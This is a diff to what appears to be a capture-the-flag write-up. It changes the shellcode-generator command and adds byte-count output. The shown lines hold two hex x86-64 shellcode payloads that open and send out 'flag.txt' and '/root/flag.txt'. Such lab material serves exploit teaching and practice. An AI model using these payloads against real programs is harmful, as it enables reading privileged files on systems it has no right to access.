@@ -117,7 +117,9 @@ We'll need to make a flag to test the code:
 
 Now use shellcodePwn.py to generatecode to read the file "flag.txt":
 
-    ./shellcodePwn.py 
+    ./Documents/Scripts/shellcode.py
+    Shellcode contains N bytes: 44
+    
     6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
 
 Next, we'll test it:
@@ -128,7 +130,9 @@ Next, we'll test it:
 
 Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
 
-    $ ./shellcodePwn.py 
+    ./Documents/Scripts/shellcode.py
+    Shellcode contains N bytes: 64
+    
     48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
 
 
